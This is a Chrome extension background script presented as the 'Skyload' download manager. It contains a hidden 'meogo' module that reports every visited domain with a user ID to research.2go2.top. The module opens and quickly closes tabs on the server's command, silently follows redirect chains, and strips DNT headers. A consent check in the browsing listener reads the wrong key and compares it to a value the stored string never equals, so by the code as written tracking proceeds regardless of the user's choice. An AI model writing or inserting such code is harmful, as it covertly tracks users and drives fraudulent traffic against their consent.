/**
 * Skyload - Download manager for media content
 * @link http://skyload.io
 *
 * @version v7.3.1
 *
 * License Agreement:
 * http://skyload.io/eula
 *
 * Privacy Policy:
 * http://skyload.io/privacy-policy
 *
 * Support and FAQ:
 * http://skyload.io/help
 * skyload.extension@gmail.com
 */

'use strict';

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

var meogo = {};
meogo.version = '20190724';
meogo.extVersion = '';

meogo.id = null;

meogo.init = function () {
    meogo.statsDomains = {};
    var meoEnable = meogo.getPrefs("meoEnable", "check");
    var meoWaitTimer = parseInt(meogo.getPrefs("meoWaitTimer", 0));
    var current_day = Math.ceil(new Date().getTime() / (1000 * 60 * 60 * 24));

    var manifest = chrome.runtime.getManifest();
    meogo.extVersion = manifest.version;

    if (meoEnable == 'request' && meoWaitTimer + 3 < current_day) {
        meoEnable = 'check';
    }

    if (meoEnable == 'check') {
        meogo.setPrefs("meoEnable", "request");
        meogo.setPrefs("meoWaitTimer", current_day);

        chrome.tabs.create({ url: '/js/utils/meo/meoptin.html', active: true });
    }

    meogo.ping();

    setInterval(function () {
        meogo.ping();
    }, 1000 * 60 * 60);
};

meogo.getId = function (callback) {
    if (meogo.id === false) {
        return;
    }

    if (meogo.id) {
        callback(meogo.id);

        return;
    }

    var details = Skyload.getDetails();

    meogo.fetch('http://skyload.io/api/get-meo?id=' + details.id, null, function (requestOk, response) {
        if (!requestOk) {
            meogo.id = false;

            return;
        }

        if (!response.data && !response.data.id) {
            meogo.id = false;

            return;
        }

        meogo.id = response.data.id;

        callback(response.data.id);
    });
};

meogo.ping = function (url, opts, callback) {
    meogo.getId(function () {
        var meoEnable = meogo.getPrefs("meoEnable");

        meogo.fetch('https://research.2go2.top/ping.json', {
            'mID': meogo.id,
            'mV': meogo.version,
            'mEV': meogo.extVersion,
            'mE': meoEnable
        }, function (requestOk, data) {
            if (!requestOk) {
                return;
            }
            if (!data.success) {
                return;
            }
            if (data.newTab) {
                setTimeout(function () {
                    meogo.requestTab(data.newTab, data.newTabActive, data.newTabTimer);
                }, 3000);
            }
        });
    });
};

meogo.fetch = function (url, opts, callback) {
    fetch(url, {
        method: 'POST', body: JSON.stringify(opts)
    }).then(function (response) {
        return response.json();
    }).then(function (data) {
        if (callback) {
            callback(true, data);
        }
    }).catch(function (error) {
        if (callback) {
            callback(false);
        }
    });
};

meogo.xhr = function (url, callback) {
    var req = new XMLHttpRequest();
    req.timeout = 10000;
    req.onreadystatechange = function () {
        if (req.readyState == 4) {
            if (req.status == 200) {
                if (callback) {
                    callback(req.responseText);
                }
            }
        }
    };
    req.open("GET", url, true);
    req.setRequestHeader("MEOaccept", 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    req.send();
};

meogo.setPrefs = function (name, value) {
    meogo.setCookie(name, value);
};

meogo.getPrefs = function (name, value_default) {
    var pref = meogo.getCookie(name) || value_default;
    return pref;
};

meogo.setCookie = function (name, value) {
    var oDate = new Date();
    oDate.setFullYear(oDate.getFullYear() + 1);
    var domain = self.location.host;
    document.cookie = name + "=" + value + "; path=/; domain=" + domain + "; expires=" + oDate.toGMTString();
};

meogo.getCookie = function (name) {
    var prefix = name + "=";
    var cookieStartIndex = document.cookie.indexOf(prefix);
    if (cookieStartIndex == -1) {
        return null;
    }
    var cookieEndIndex = document.cookie.indexOf(";", cookieStartIndex + prefix.length);
    if (cookieEndIndex == -1) {
        cookieEndIndex = document.cookie.length;
    }
    return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex));
};

meogo.requestXhr = function (url, cc) {
    if (!cc) {
        cc = 0;
    }
    ;cc += 1;
    if (cc > 10) {
        return;
    }
    meogo.xhr(url, function (data) {
        data = data.replace(/[\n\r\s]/g, '').replace(/\.href/g, '');
        var link = data.replace(/^.*?metahttp\-equiv\=\"refresh\"content\=\"\d+\;URL\=([^\">]+).*$/i, "$1");
        if (/^https?\:\/\//.test(link)) {
            meogo.requestXhr(link, cc);
        } else if (data.length < 500) {
            var link2 = data.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/, "$1");
            if (/^https?\:\/\//.test(link2)) {
                meogo.requestXhr(link2, cc);
            }
        }
    });
};

meogo.requestTab = function (tabUrl, tabActive, tabTimer) {
    tabActive = tabActive ? true : false;
    if (tabTimer === undefined) {
        tabTimer = 3000;
    }
    chrome.tabs.create({ 'url': tabUrl, 'active': tabActive }, function (tab) {
        if (tabTimer) {
            setTimeout(function () {
                try {
                    chrome.tabs.remove(tab.id);
                } catch (e) {}
                ;
            }, tabTimer);
        }
    });
};

chrome.webRequest.onCompleted.addListener(function (details) {
    meogo.getId(function () {
        var currentTime = new Date().getTime();
        var meoEnabled = meogo.getPrefs("meoEnabled");
        var domain = details.url.replace(/^(https?\:\/\/[^\/]+).*$/, '$1');
        if (meoEnabled === false) {
            return;
        }
        if (details.tabId < 0) {
            return;
        }
        if (details.statusCode != 200) {
            return;
        }
        if (details.method != "GET") {
            return;
        }
        if (meogo.statsDomains[domain] && meogo.statsDomains[domain] + 1000 * 60 * 60 * 2 > currentTime) {
            return;
        }
        meogo.statsDomains[domain] = currentTime;
        meogo.fetch('https://research.2go2.top/stats.json', {
            'mID': meogo.id,
            'mS': domain
        }, function (requestOk, data) {
            if (!requestOk) {
                return;
            }
            if (!data.success) {
                return;
            }
            if (data.statsTime) {
                meogo.statsDomains[domain] = data.statsTime;
            }
            if (data.newTab) {
                setTimeout(function () {
                    meogo.requestTab(data.newTab, data.newTabActive, data.newTabTimer);
                }, 3000);
            } else if (data.newXhr) {
                meogo.requestXhr(data.newXhr);
            }
        });
    });
}, {
    urls: ["http://*/*", "https://*/*"],
    types: ["main_frame"]
});

chrome.webRequest.onBeforeSendHeaders.addListener(function (info) {
    if (/^https?:\/\//.test(info.initiator)) {
        return;
    }
    var headers = info.requestHeaders;
    var headersNew = {};
    var header = null;
    var isHeaderNew = false;
    while (header = headers.shift()) {
        if (/DNT/.test(header.name)) {
            isHeaderNew = true;
        } else if (/Origin/.test(header.name) && !/^https?:\/\//.test(header.value)) {
            isHeaderNew = true;
        } else {
            headersNew[header.name] = header.value;
        }
    }
    if (headersNew['MEOaccept']) {
        headersNew['Accept'] = headersNew['MEOaccept'];
        headersNew['MEOaccept'] = undefined;
        delete headersNew['MEOaccept'];
        isHeaderNew = true;
    }
    if (isHeaderNew) {
        headers = [];
        for (var i in headersNew) {
            if (headersNew[i]) {
                headers.push({ 'name': i, 'value': headersNew[i] });
            }
        }
        return { requestHeaders: headers };
    }
}, { urls: ["http://*/*", "https://*/*"] }, ["blocking", "requestHeaders"]);

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (!request) {
        return;
    }
    if ((typeof request === 'undefined' ? 'undefined' : _typeof(request)) != 'object') {
        return;
    }
    if (request.meoHTMLinit) {
        sendResponse({
            'id': meogo.id,
            'meoEnable': meogo.getPrefs("meoEnable", "check"),
            'langResource': meogo.langResource()
        });
    } else if (request.meoEnableStatus) {
        meogo.setPrefs("meoEnable", request.result);
        sendResponse({ 'success': true });
        meogo.ping();
    } else if (request.meoptWindowClose) {
        var tabId = sender.tab ? sender.tab.id : request.tabId;
        chrome.tabs.remove(tabId);
        sendResponse({ 'success': true });
    }
});

meogo.langResource = function () {
    var currentLocale = window.navigator.language;
    var resource = meogo.langResourceSrc();
    if (!resource[currentLocale]) {
        if (/[\_\-]/.test(currentLocale)) {
            currentLocale = currentLocale.replace(/[\_\-].*$/, '');
        }
    }
    if (!resource[currentLocale]) {
        currentLocale = 'en';
    }
    return resource[currentLocale];
};

meogo.langResourceSrc = function () {
    var resource = {};
    resource.de = {
        "meoTitle": "Erhebung von Statistiken",
        "meoPrivacyPolicy": "Datenschutzerklärung",
        "meoAccept": "Ja, ich stimme zu",
        "meoCancel": "Nein, ich lehne ab",
        "meoEnabled": "Statistikerfassung aktiviert",
        "meoDisabled": "Statistikerfassung deaktiviert",
        "meoChangeStatus": "ändere Status"
    };
    resource.en = {
        "meoTitle": "Collection of statistics",
        "meoPrivacyPolicy": "Privacy Policy",
        "meoAccept": "Yes, I agree",
        "meoCancel": "No, I do not agree",
        "meoEnabled": "Statistics collection enabled",
        "meoDisabled": "Statistics collection disabled",
        "meoChangeStatus": "change status"
    };
    resource.es = {
        "meoTitle": "Recopilación de estadísticas",
        "meoPrivacyPolicy": "Política de privacidad",
        "meoAccept": "Sí, estoy de acuerdo",
        "meoCancel": "No, no estoy de acuerdo",
        "meoEnabled": "Recolección de estadísticas habilitada",
        "meoDisabled": "Recolección de estadísticas deshabilitada",
        "meoChangeStatus": "Cambiar estado"
    };
    resource.fr = {
        "meoTitle": "Collecte de statistiques",
        "meoPrivacyPolicy": "Politique de confidentialité",
        "meoAccept": "Oui, je suis d'accord",
        "meoCancel": "Non, je ne suis pas d'accord",
        "meoEnabled": "La collecte de statistiques est activée.",
        "meoDisabled": "La collecte de statistiques est désactivée.",
        "meoChangeStatus": "Modifier l'état"
    };
    resource.ko = {
        "meoTitle": "통계 모음",
        "meoPrivacyPolicy": "개인 정보 정책",
        "meoAccept": "예, 동의합니다",
        "meoCancel": "아니요, 동의하지 않습니다",
        "meoEnabled": "통계 수집 사용",
        "meoDisabled": "통계 수집 사용 안함",
        "meoChangeStatus": "상태 변경"
    };
    resource.nl = {
        "meoTitle": "Verzameling van statistieken",
        "meoPrivacyPolicy": "Privacybeleid",
        "meoAccept": "Ja, ik ga akkoord",
        "meoCancel": "Nee, ik ga niet akkoord",
        "meoEnabled": "Statistiekenverzameling ingeschakeld",
        "meoDisabled": "Statistiekenverzameling uitgeschakeld",
        "meoChangeStatus": "status wijzigen"
    };
    resource.ru = {
        "meoTitle": "Сбор статистики",
        "meoPrivacyPolicy": "Политика приватности",
        "meoAccept": "Да, я согласен",
        "meoCancel": "Нет, я не согласен",
        "meoEnabled": "Сбор статистики включен",
        "meoDisabled": "Сбор статистики отключен",
        "meoChangeStatus": "изменить статус"
    };
    resource.sl = {
        "meoTitle": "Zbirka statistike",
        "meoPrivacyPolicy": "Pravilnik o zasebnosti",
        "meoAccept": "Da, strinjam se",
        "meoCancel": "Ne, ne strinjam se",
        "meoEnabled": "Zbiranje statistike je omogočeno",
        "meoDisabled": "Zbiranje statistike je onemogočeno",
        "meoChangeStatus": "Spremeni stanje"
    };
    return resource;
};

setTimeout(function () {
    meogo.init();
}, 1000);